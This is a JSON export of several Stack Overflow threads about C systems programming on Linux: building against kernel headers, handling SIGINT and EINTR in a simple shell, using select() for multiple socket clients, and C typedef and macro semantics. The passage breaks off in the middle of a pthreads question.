[{"tags": ["c", "linux", "makefile", "linux-kernel"], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 4081092, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/2ee03f5332344af20705021869dbe384?s=128&d=identicon&r=PG&f=1", "display_name": "Tyler", "link": "https://stackoverflow.com/users/4081092/tyler"}, "edited": false, "score": 0, "creation_date": 1459442865, "post_id": 36321962, "comment_id": 60300386, "body": "I am learning fundamentals of linux kernel programming and thus have been building modules. Right now I am trying to build what I believe is called a &quot;user space device driver&quot; where I will be interacting with /dev/mem/ and custom file in /proc/. I would like access to some of the preprocessor variables and structures defined in some of the page-table headers for my architecture. What would be your recommendation for such a situation? Thanks again."}, {"owner": {"reputation": 3111, "user_id": 479941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ebad9df474aa1949c09ef5136e55fd33?s=128&d=identicon&r=PG", "display_name": "Mark Nunberg", "link": "https://stackoverflow.com/users/479941/mark-nunberg"}, "reply_to_user": {"reputation": 17, "user_id": 4081092, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/2ee03f5332344af20705021869dbe384?s=128&d=identicon&r=PG&f=1", "display_name": "Tyler", "link": "https://stackoverflow.com/users/4081092/tyler"}, "edited": false, "score": 0, "creation_date": 1459443137, "post_id": 36321962, "comment_id": 60300552, "body": "My recommendation would be to look into existing programs that do the same thing and see what they do. Unfortunately I&#39;ve never done architecture-specific user drivers, only routing, filesystem, and accounting"}, {"owner": {"reputation": 17, "user_id": 4081092, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/2ee03f5332344af20705021869dbe384?s=128&d=identicon&r=PG&f=1", "display_name": "Tyler", "link": "https://stackoverflow.com/users/4081092/tyler"}, "edited": false, "score": 0, "creation_date": 1459445093, "post_id": 36321962, "comment_id": 60301691, "body": "I&#39;ll look around some more. Generally speaking I&#39;ve found code excerpts but not accompanying Makefiles."}], "tags": [], "owner": {"reputation": 3111, "user_id": 479941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ebad9df474aa1949c09ef5136e55fd33?s=128&d=identicon&r=PG", "display_name": "Mark Nunberg", "link": "https://stackoverflow.com/users/479941/mark-nunberg"}, "is_accepted": true, "score": 1, "last_activity_date": 1459382825, "creation_date": 1459382825, "answer_id": 36321962, "question_id": 36321851, "link": "https://stackoverflow.com/questions/36321851/proper-build-environment-for-linux-user-space-programs/36321962#36321962", "title": "Proper Build Environment for Linux User-space Programs", "body": "<p>Most user-space programs using the Linux kernel headers don't need to do anything special. <code>linux/</code> is already included in the default include paths, e.g. <code>#include &lt;linux/netlink.h&gt;</code> . Distributions will include these files as part of their stanh>dard developer package, for example <code>build-essential</code> on Debian.</p>\n\n<p>You can also get headers specific for your kernel version, which is required when building a kernel module, but userspace programs will typically only interact with sockets and pipes and thus just need some structure definitions or protocol helpers for those channels (for example, Netlink).</p>\n"}], "owner": {"reputation": 17, "user_id": 4081092, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/2ee03f5332344af20705021869dbe384?s=128&d=identicon&r=PG&f=1", "display_name": "Tyler", "link": "https://stackoverflow.com/users/4081092/tyler"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 142, "favorite_count": 0, "accepted_answer_id": 36321962, "answer_count": 1, "score": 1, "last_activity_date": 1459382825, "creation_date": 1459382154, "question_id": 36321851, "link": "https://stackoverflow.com/questions/36321851/proper-build-environment-for-linux-user-space-programs", "title": "Proper Build Environment for Linux User-space Programs", "body": "<p>I need to build a Linux user-space program that includes headers from the Linux Kernel. However those headers in turn seem to use other headers and so on. So my question is, what is the proper/good way of including all off the possible directories I could require in my Makefile? Thank you.</p>\n"}, {"tags": ["c", "signals"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1459382252, "post_id": 36321833, "comment_id": 60266844, "body": "Why are you unsure why you&#39;re getting that output?"}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 4, "creation_date": 1459382280, "post_id": 36321833, "comment_id": 60266854, "body": "You can&#39;t call <code>printf</code> or <code>fflush</code> from a signal handler!"}, {"owner": {"reputation": 2558, "user_id": 655436, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/98da4e7757d5f0e8596fd832bebee3d0?s=128&d=identicon&r=PG", "display_name": "fukanchik", "link": "https://stackoverflow.com/users/655436/fukanchik"}, "edited": false, "score": 0, "creation_date": 1459382361, "post_id": 36321833, "comment_id": 60266875, "body": "<a href=\"http://stackoverflow.com/questions/16891019/how-to-avoid-using-printf-in-a-signal-handler\" title=\"how to avoid using printf in a signal handler\">stackoverflow.com/questions/16891019/&hellip;</a>"}, {"owner": {"reputation": 11, "user_id": 5412276, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-n4N7zjfXuUs/AAAAAAAAAAI/AAAAAAAACeE/7BcC6e0d0Xs/photo.jpg?sz=128", "display_name": "Tavish Wille", "link": "https://stackoverflow.com/users/5412276/tavish-wille"}, "edited": false, "score": 0, "creation_date": 1459382640, "post_id": 36321833, "comment_id": 60266962, "body": "I still get the same output even without a call to either printf or fflush"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459384682, "post_id": 36321833, "comment_id": 60267559, "body": "Read your own code.  You do a pretty good job of catching errors emitted by system functions, and you observe error-handling behavior that your code is written to exhibit.  Your code will tell you what function call must be failing, and a read of that function&#39;s docs in light of the <code>perror()</code> error message will surely be illuminating."}], "answers": [{"tags": [], "owner": {"reputation": 86, "user_id": 2482902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd009f6544a3ca082afdf9e9e6269ab2?s=128&d=identicon&r=PG", "display_name": "Jos&#233; Rios", "link": "https://stackoverflow.com/users/2482902/jos%c3%a9-rios"}, "is_accepted": false, "score": 0, "last_activity_date": 1459390145, "last_edit_date": 1459390145, "creation_date": 1459389047, "answer_id": 36322776, "question_id": 36321833, "link": "https://stackoverflow.com/questions/36321833/handling-sigint-in-c/36322776#36322776", "title": "Handling SIGINT in C", "body": "<p>Your program is doing what you told it, i.e., <strong>exit</strong> when read returns <strong>any kind of error</strong>:</p>\n\n<pre><code>/* read what the user enters on the command line */\nlength = read(STDIN_FILENO, inputBuffer, MAX_LINE);\n\nstart = -1;\nif (length == 0)\n    exit(0);\nif (length &lt; 0){\n    perror(\"error reading the command\");\n    exit(-1);   // &lt;----- Exit at any kind of error\n}\n</code></pre>\n\n<p>From <a href=\"http://man7.org/linux/man-pages/man2/read.2.html\" rel=\"nofollow\">read(2)</a> man page:</p>\n\n<blockquote>\n  <p>On error, -1 is returned, and errno is set appropriately.  In this case, it is left unspecified whether the file position (if any) changes.</p>\n  \n  <p>EINTR  The call was interrupted by a signal before any data was read;\n                see signal(7).</p>\n</blockquote>\n\n<p>Just check after read whether the error was a signal interrupt (include <code>errno.h</code>):</p>\n\n<pre><code>length = 0;\nwhile (length &lt;= 0) {\n    printf(\"COMMAND-&gt;\");\n    fflush(0);\n\n    /* read what the user enters on the command line */\n    length = read(STDIN_FILENO, inputBuffer, MAX_LINE);\n\n    start = -1;\n    if (length == 0)\n        exit(0);            /* ^d was entered, end of user command stream */\n    if (length &lt; 0 &amp;&amp; errno != EINTR) {\n        perror(\"error reading the command\");\n        exit(-1);           /* terminate with error code of -1 */\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 5412276, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-n4N7zjfXuUs/AAAAAAAAAAI/AAAAAAAACeE/7BcC6e0d0Xs/photo.jpg?sz=128", "display_name": "Tavish Wille", "link": "https://stackoverflow.com/users/5412276/tavish-wille"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 633, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1459390145, "creation_date": 1459382045, "question_id": 36321833, "link": "https://stackoverflow.com/questions/36321833/handling-sigint-in-c", "title": "Handling SIGINT in C", "body": "<p>I am trying to handle SIGINT in my C code but am getting the following output and I am unsure why</p>\n\n<pre><code>COMMAND-&gt;hello\nCOMMAND-&gt;world\nCOMMAND-&gt;test\nCOMMAND-&gt;^CI don't know! \nerror reading the command: Interrupted system call\n</code></pre>\n\n<p>Here is my code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;string.h&gt;\n\n#define MAX_LINE 80 /* 80 chars per line, per command, should be enough. */\n\n\n//The function used to handle the signal:\nvoid handle_SIGINT(){\n    printf(\"I don't know! \\n\");\n    fflush(stdout);\n}\n\n/**\n * setup() reads in the next command line, separating it into distinct tokens\n * using whitespace as delimiters. setup() sets the args parameter as a \n * null-terminated string.\n */\n\nvoid setup(char inputBuffer[], char *args[], int *background)\n{\n    int length, /* # of characters in the command line */\n        i,      /* loop index for accessing inputBuffer array */\n        start,  /* index where beginning of next command parameter is */\n        ct;     /* index of where to place the next parameter into args[] */\n\n    ct = 0;\n\n    /* read what the user enters on the command line */\n    length = read(STDIN_FILENO, inputBuffer, MAX_LINE);\n\n    start = -1;\n    if (length == 0)\n        exit(0);            /* ^d was entered, end of user command stream */\n    if (length &lt; 0){\n        perror(\"error reading the command\");\n    exit(-1);           /* terminate with error code of -1 */\n    }\n\n    /* examine every character in the inputBuffer */\n    for (i = 0; i &lt; length; i++) { \n        switch (inputBuffer[i]){\n        case ' ':\n        case '\\t' :               /* argument separators */\n            if(start != -1){\n                args[ct] = &amp;inputBuffer[start];    /* set up pointer */\n                ct++;\n            }\n            inputBuffer[i] = '\\0'; /* add a null char; make a C string */\n            start = -1;\n            break;\n\n        case '\\n':                 /* should be the final char examined */\n            if (start != -1){\n                args[ct] = &amp;inputBuffer[start];     \n                ct++;\n            }\n            inputBuffer[i] = '\\0';\n            args[ct] = NULL; /* no more arguments to this command */\n            break;\n\n        case '&amp;':\n            *background = 1;\n            inputBuffer[i] = '\\0';\n            break;\n\n        default :             /* some other character */\n            if (start == -1)\n                start = i;\n    } \n    }    \n    args[ct] = NULL; /* just in case the input line was &gt; 80 */ \n} \n\nint main(void)\n{\n    char inputBuffer[MAX_LINE]; /* buffer to hold the command entered */\n    int background;             /* equals 1 if a command is followed by '&amp;' */\n    char *args[MAX_LINE/2+1];/* command line (of 80) has max of 40 arguments */\n\n    //Setup the signal handler\n    struct sigaction handler;\n    handler.sa_handler = handle_SIGINT;\n    sigaction(SIGINT, &amp;handler, NULL);\n\n\n    while (1){            /* Program terminates normally inside setup */\n    background = 0;\n    printf(\"COMMAND-&gt;\");\n        fflush(0);\n        setup(inputBuffer, args, &amp;background);       /* get next command */\n\n    /* the steps are:\n     (1) fork a child process using fork()\n     (2) the child process will invoke execvp()\n     (3) if background == 0, the parent will wait, \n        otherwise returns to the setup() function. */\n\n     //The fork\n     pid_t pid = fork();\n\n     //If it is the child, execute the code\n     if(pid == 0){\n            execvp(inputBuffer, args);\n            exit(0);\n        }\n    if(background == 0){\n        wait(NULL);\n    }\n\n    }\n}\n</code></pre>\n\n<p>I would like to be able to return to the \"command line\" and continue checking for input. </p>\n"}, {"tags": ["c", "sockets", "select", "file-descriptor"], "comments": [{"owner": {"reputation": 33, "user_id": 4860801, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/29975ee69ef612512743c99b668a2554?s=128&d=identicon&r=PG&f=1", "display_name": "spicelord", "link": "https://stackoverflow.com/users/4860801/spicelord"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1459382211, "post_id": 36321791, "comment_id": 60266835, "body": "I tried using select instead of accept in the first if statement, and of course added the fd_set and other needed bits. The server started, but it would not accept any input"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1459382327, "post_id": 36321791, "comment_id": 60266868, "body": "You tried using select instead of accept? select and accept do different things. That would be like trying to use a hammer instead of a pair of headphones, and expecting to still hear music - it doesn&#39;t really make sense at all."}, {"owner": {"reputation": 33, "user_id": 4860801, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/29975ee69ef612512743c99b668a2554?s=128&d=identicon&r=PG&f=1", "display_name": "spicelord", "link": "https://stackoverflow.com/users/4860801/spicelord"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1459382407, "post_id": 36321791, "comment_id": 60266887, "body": "thanks that&#39;s quite helpful. Of course they do. I am trying to find out what to do to properly use select, instead of accept."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 2, "creation_date": 1459382518, "post_id": 36321791, "comment_id": 60266926, "body": "The code you have has several issues anyway - the ususal suspects.  Failure to correctly and completely handle the result returned by recv().  Failure to handle the octet streaming nature of TCP and the assumption that TCP can transfer, on its own, messages larger than one byte.  Misuse of strlen()-style calls on char buffers that are not guaranteed null-terminated.  Probably more:("}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459384208, "post_id": 36321791, "comment_id": 60267452, "body": "As for <code>select()</code>, it is used to determine which sockets <i>currently</i> have data available to read, and / or are prepared to accept data you write.  You use <code>select()</code> to multiplex multiple sockets, reading each when there&#39;s actually something to read, so that you do not block on one socket when there&#39;s data available from another."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459384300, "post_id": 36321791, "comment_id": 60267473, "body": "As an alternative to <code>select()</code>, you might also be able to handle each connection in a separate thread or child process.  The I/O handling is easier in these approaches, but they have their own challenges."}, {"owner": {"reputation": 3854, "user_id": 2235885, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/09d0d6a08639ef79ef960a52bd013e02?s=128&d=identicon&r=PG", "display_name": "joop", "link": "https://stackoverflow.com/users/2235885/joop"}, "edited": false, "score": 0, "creation_date": 1459416279, "post_id": 36321791, "comment_id": 60280768, "body": "<code>if (digit &lt; 48 &amp;&amp; digit &gt; 57)</code> There is very little chance that this condition will ever be true."}], "answers": [{"tags": [], "owner": {"reputation": 897, "user_id": 3830887, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9aa739aedfb6760abc3605091e12810e?s=128&d=identicon&r=PG&f=1", "display_name": "TonyB", "link": "https://stackoverflow.com/users/3830887/tonyb"}, "is_accepted": false, "score": 0, "last_activity_date": 1459415712, "creation_date": 1459415712, "answer_id": 36329073, "question_id": 36321791, "link": "https://stackoverflow.com/questions/36321791/using-select-for-multiple-socket-connections-c/36329073#36329073", "title": "Using Select for Multiple Socket Connections C", "body": "<p>If your question is HOW to use select() in a server... \nHere is a snippet off the top of my head of one technique \nto get you started... bear in mind all error checking is not\npresent, and it is not optimized to function in a round robin \nbasis...</p>\n\n<pre><code>listen(sockfd, SOMAXCONN)\n\nfd_set my_set;\nfd_set wk_set;\n\nFD_ZERO(&amp;my_set);         /* initialize  fd_set */\nFD_SET(sock_fd, &amp;my_set)  /* put listener into fd_set */\nmax_fd = sockfd;\n\nwhile( TRUE )\n{\n    memcpy(&amp;wk_set, &amp;my_set, sizeof(my_set));\n\n    rc = select(max_fd + 1, &amp;wk_set, NULL, NULL, NULL )\n    if ( rc == -1 )\n    {\n        if ( errno == EINTR )\n            continue;\n        printf(\"select failed: errno = %d\\n\", errno);\n        exit(1);\n    }\n    for(i = 0; i &lt; max_fd; i++) /* check everything in wk_set */\n    {\n        if ( FD_ISSET(i, &amp;wk_set)\n        {\n            if ( i == sockfd )  /* is it the listener socket?? */\n            {\n                wk_sock=accept(sockfd, (struct sockaddr*)&amp;cli_addr, &amp;clilen);\n                if ( wk_sock == -1 )\n                {\n                    printf(\"accept failed: errno=%d\\n\", errno);\n                    exit(1);\n                }\n                FD_SET(wk_sock, &amp;my_set);  /* put into fd_set */\n                if ( wk_sock &gt; max_sock )\n                    max_sock = wk_sock;\n            }else{\n                /* ready to read from this socket */\n                recv_len = recv(i, .... )\n                if ( recv_len == 0 ) /* client disconnected */\n                {\n                    close(i);\n                    FD_CLR(i, &amp;my_set);\n                    if (i == max_fd )\n                    {\n                        for(x=0;x&lt;max_fd;x++)  /* find new max_fd */\n                        {\n                            if ( FD_ISSET(x, &amp;my_set )\n                                max_fd = x;\n                        }\n                    }\n                } else { \n                handle message from client\n                }\n            }\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 4860801, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/29975ee69ef612512743c99b668a2554?s=128&d=identicon&r=PG&f=1", "display_name": "spicelord", "link": "https://stackoverflow.com/users/4860801/spicelord"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1747, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1459415712, "creation_date": 1459381799, "question_id": 36321791, "link": "https://stackoverflow.com/questions/36321791/using-select-for-multiple-socket-connections-c", "title": "Using Select for Multiple Socket Connections C", "body": "<p>I am trying to build a server and client for a chat server using sockets. I know that I am supposed to use select() to get input from multiple sockets, but I am not sure how to do it and still read from them properly. As my code sits, it reads perfectly fine from one client, but when two are open it ignores everything that the second client does, until the first is closed.</p>\n\n<p>I am wondering how to properly implement select to make sure that I can take input from multiple sockets. Thanks in advance.</p>\n\n<pre><code>#include \"../../include/my.h\"\n\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdio.h&gt;\n\nvoid interrupt();\n\nvoid interrupt()\n{\n    my_str(\"Server exiting.\\n\");\n    exit(0);\n}\n\nint str_to_num(char* str)      \n{\n        int i = 0;\n        int numDigits = 0;\n        int ret = 0;\n\n        while (str[numDigits] != '\\0')\n        {\n                numDigits++;\n        }\n\n        while (i &lt; numDigits)\n        {\n                int digit = str[i];\n\n                if (digit &lt; 48 &amp;&amp; digit &gt; 57)\n                        return -1;\n\n                digit -= 48;\n\n                ret += digit * my_pow(10, numDigits - i - 1);\n                i++;\n        }\n\n        return ret;\n}\n\nchar* add_null_term(char* str)\n{\n    int i = 0;\n\n    while (str[i] != '\\0')\n        i++;\n\n    str[i] = '\\0';\n\n    return str;\n}\nint main(int argc, char **argv)\n{\n    int sockfd, newsockfd, portnum;\n    int len;\n    char buffer[256];\n    /*char *username = (char*)malloc(256*sizeof(char));*/\n    socklen_t clilen;\n    struct sockaddr_in serv_addr, cli_addr;\n\n    /*check args*/\n    if (argc &lt; 2)\n    {\n        my_str(\"Usage: ./server &lt;port_number&gt;\\n\");\n        exit(0);\n    }\n\n    portnum = str_to_num(argv[1]);\n\n    if (portnum &lt; 1024)\n    {\n        perror(\"Ports below 1024 are reserved for root access.\\n\");\n        exit(0);\n    }\n\n    if (portnum &lt; 1 || portnum &gt; 65535)\n    {\n        my_str(\"Port must be between 1 and 65535\\n\");\n        exit(0);\n    }\n\n    signal(SIGINT, interrupt);\n\n    sockfd = socket(AF_INET, SOCK_STREAM, 0);\n\n    bzero((char*)&amp;serv_addr, sizeof(serv_addr));\n\n    serv_addr.sin_family = AF_INET;\n\n    serv_addr.sin_port = htons(portnum);\n\n    serv_addr.sin_addr.s_addr = INADDR_ANY;\n\n    if (bind(sockfd, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr))&lt;0)\n    {\n        perror(\"bind\");\n        exit(0);\n    }\n\n    listen(sockfd, 5);\n\n    clilen = sizeof(cli_addr);\n\n    while(1)\n    {\n        if ((newsockfd=accept(sockfd, (struct sockaddr*)&amp;cli_addr, &amp;clilen)) &lt; 0)\n        {\n            perror(\"accept\");\n            exit(0);\n        }\n\n        usleep(2000);\n\n        my_str(\"Server received: \");\n\n        while ((len = read(newsockfd, &amp;buffer, 256)) &gt; 0)\n        {\n            buffer[my_strlen(buffer)] = '\\0';\n\n            if (my_strcmp(buffer, \"/\") == 0)\n            {\n                my_str(\"Error: command \");\n                my_str(buffer);\n                my_str(\"not found.\\n\");\n                bzero((char*)&amp;buffer, sizeof(buffer));\n            }\n\n            /*if (count == 0)\n            {\n                my_strcpy(username, buffer);\n                my_str(\"setting nickname to: \");\n                my_str(username);\n                bzero((char*)&amp;buffer, sizeof(buffer));\n                my_str(buffer);\n                count++;\n                my_str(\"\\n\");\n            }*/\n\n            /*else if (my_strncmp(buffer, \"/me\", 3) == 0)\n            {\n                my_str(username);\n                my_str(\" \");\n                my_str(&amp;buffer[4]);\n                bzero((char*)&amp;buffer, sizeof(buffer));\n                my_str(\"\\n\");\n            }\n\n            else if (my_strncmp(buffer, \"/nick\", 5) == 0)\n            {\n                my_str(\"Changing nickname of \");\n                my_str(username);\n                my_strcpy(username, &amp;buffer[6]);\n                my_str(\" to \");\n                my_str(username);\n                bzero((char*)&amp;buffer, sizeof(buffer));\n                my_str(\"\\n\");\n            }*/\n\n            /*else\n            {*/\n                /*my_str(username);\n                my_str(\": \");*/\n                my_str(buffer);\n                bzero((char*)&amp;buffer, sizeof(buffer));\n                my_str(buffer);\n                my_str(\"\\n\");\n            /*}*/\n        }\n\n        my_str(\"\\nServer: Message end. Waiting for next connection.\\n\");\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "operating-system"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459386050, "post_id": 36321759, "comment_id": 60267896, "body": "<code>typedef unsigned long uint64_t;</code> should not be in an application header, but the compiler header. It is a C standard type, already defined in <code>stdint.h</code>. Every C compiler is required to provide it. That does not look like C code. If it is C++, please change the tag and text."}, {"owner": {"reputation": 18530, "user_id": 3344003, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/988af95d5692ee66b1fc2fe725ba738e?s=128&d=identicon&r=PG&f=1", "display_name": "user3344003", "link": "https://stackoverflow.com/users/3344003/user3344003"}, "edited": false, "score": 0, "creation_date": 1459387546, "post_id": 36321759, "comment_id": 60268254, "body": "Actually it looks like bastardize C++ looking something like C. :-)"}, {"owner": {"reputation": 11, "user_id": 4820953, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5398d034c378d37a376a9f2591548dbc?s=128&d=identicon&r=PG&f=1", "display_name": "Manish", "link": "https://stackoverflow.com/users/4820953/manish"}, "edited": false, "score": 0, "creation_date": 1459396980, "post_id": 36321759, "comment_id": 60270647, "body": "Yes, it is copied from stdint.h. I wanted to put all the related code here. And, it is C code."}], "answers": [{"tags": [], "owner": {"reputation": 15165, "user_id": 1116364, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/b67dfca0caba03083330d39a304b1766?s=128&d=identicon&r=PG", "display_name": "Daniel Jour", "link": "https://stackoverflow.com/users/1116364/daniel-jour"}, "is_accepted": false, "score": 0, "last_activity_date": 1459449965, "creation_date": 1459449965, "answer_id": 36341274, "question_id": 36321759, "link": "https://stackoverflow.com/questions/36321759/why-do-we-have-eventmasktype-twice-in-the-last-line/36341274#36341274", "title": "Why do we have &quot;EventMaskType&quot; twice in the last line?", "body": "<pre><code>typedef unsigned long uint64_t;\ntypedef uint64_t        EventMaskType;\n#define EVENT_MASK_OsEvent1  EventMaskType((EventMaskType)1u&lt;&lt;1)\n</code></pre>\n\n<p>The first line defines the type <code>unsigned long</code> to be also known under the name <code>uint64_t</code>. As pointed out in the comments this should be part of the standard header <code>stdint.h</code>.</p>\n\n<p>The second line defines <code>EventMaskType</code> to be an alias of the type <code>uint64_t</code> (and as such transitively an alias of <code>unsigned long</code>).</p>\n\n<p>The third line defines a symbol macro for the preprocessor, so that every (following) occurrence of the token <code>EVENT_MASK_OsEvent1</code> will be replaced by <code>EventMaskType((EventMaskType)1u&lt;&lt;1)</code>.</p>\n\n<p>That in turn is the value <code>1u</code> (an <code>unsigned int</code>) which is cast using a \"classic C style cast\" to an value of type <code>EventMaskType</code> (which is an <code>unsigned long</code>, so instead of the cast one could also write <code>1ul</code>). This value is then shifted one bit to the left (result <code>2ul</code>) and finally cast using a <em>functional-style cast</em> to <code>EventMaskType</code> ...</p>\n\n<pre><code>EventMaskType( /* ... */)\n</code></pre>\n\n<p>... which doesn't change anything, because it's already of that type.</p>\n"}], "owner": {"reputation": 11, "user_id": 4820953, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5398d034c378d37a376a9f2591548dbc?s=128&d=identicon&r=PG&f=1", "display_name": "Manish", "link": "https://stackoverflow.com/users/4820953/manish"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 63, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1459449965, "creation_date": 1459381618, "question_id": 36321759, "link": "https://stackoverflow.com/questions/36321759/why-do-we-have-eventmasktype-twice-in-the-last-line", "title": "Why do we have &quot;EventMaskType&quot; twice in the last line?", "body": "<p>I found following C-code in OS source code files. These 3 lines were in three different source files. Why do we have \"EventMaskType\" twice in the last line? It's giving me same output even if I remove first occurence of \"EventMaskType\" from the third line.</p>\n\n<pre><code>typedef unsigned long uint64_t;\ntypedef uint64_t        EventMaskType;\n#define EVENT_MASK_OsEvent1  EventMaskType((EventMaskType)1u&lt;&lt;1)\n</code></pre>\n"}, {"tags": ["c", "multithreading", "algorithm", "operating-system", "pthreads"], "comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 0, "creation_date": 1459382452, "post_id": 36321712, "comment_id": 60266900, "body": "The prototype is <code>int pthread_create(pthread_t *, const pthread_attr_t *, void *(*) (void *), void *);</code>. The last argument of <code>pthread_create()</code> (<code>the void *</code>-argument)  is passed to the function the new thread starts in. You will have to modify your function to receive a pointer to a <code>struct</code> that contains the relevant members your function requires."}, {"owner": {"reputation": 41485, "user_id": 2521214, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/nd58V.jpg?s=128&g=1", "display_name": "Spektre", "link": "https://stackoverflow.com/users/2521214/spektre"}, "edited": false, "score": 0, "creation_date": 1459421301, "post_id": 36321712, "comment_id": 60284433, "body": "I do not code for linux but in windows the thread function must have also OS calling API specified like: <code>unsigned long __stdcall thread_function(LPVOID p);</code> where <code>p</code> is <code>far void*</code> passed from the Create thread function. If you want to pass anything else you need to overtype it to and from <code>void*</code> `"}, {"owner": {"reputation": 121, "user_id": 3505167, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/bsGA0.jpg?s=128&g=1", "display_name": "Kira", "link": "https://stackoverflow.com/users/3505167/kira"}, "edited": false, "score": 0, "creation_date": 1459436296, "post_id": 36321712, "comment_id": 60295869, "body": "Okay now I try to followed your tips so I came up with this : <a href=\"http://pastebin.com/qbRCVB5A\" rel=\"nofollow noreferrer\">pastebin.com/qbRCVB5A</a> Still I got an ERROR line 27:assignment to expression with array type .."}], "owner": {"reputation": 121, "user_id": 3505167, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/bsGA0.jpg?s=128&g=1", "display_name": "Kira", "link": "https://stackoverflow.com/users/3505167/kira"}, "delete_vote_count": 